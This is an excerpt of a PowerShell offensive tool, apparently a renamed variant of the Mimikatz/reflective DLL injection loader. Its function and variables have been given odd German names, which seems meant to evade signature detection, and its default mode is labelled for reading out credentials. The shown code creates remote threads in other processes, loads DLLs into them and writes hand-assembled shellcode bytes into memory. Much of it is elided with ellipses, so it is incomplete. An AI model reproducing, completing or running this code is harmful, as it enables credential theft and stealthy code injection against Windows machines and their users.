function Rufe-KleineHunde
{


[CmdletBinding(DefaultParameterSetName="AuslesenZugaenge")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,

    [Parameter(ParameterSetName = "AuslesenZugaenge", Position = 1)]
    [Switch]
    $AuslesenZugaenge,
...
$RemoteScriptBlock = {
	...
	Function Invoke-CreateRemoteThread
	{
		...
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			...
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $VoegelSindDieWelt, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
		...
		else
		{
			...
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $VoegelSindDieWelt, 0, [IntPtr]::Zero)
		}
	...
	Function Import-DllInRemoteProcess
	{
		...
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -VoegelSindDieWelt $RImportDllPathPtr -Win32Functions $Win32Functions #-
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		...
		if ($PEInfo.FileType -ieq "DLL")
		{
			...
			else
			{
				...
				if ($PEInfo.PE64Bit -eq $true)
				{
					...
					$OnkelOnkelOnkel = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
				...
				else
				{
					...
					$OnkelOnkelOnkel = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $OnkelOnkelOnkel.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $OnkelOnkelOnkel -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($OnkelOnkelOnkel.Length)
...
Function Main
{
	...
	if ($PsCmdlet.ParameterSetName -ieq "AuslesenZugaenge")
	{
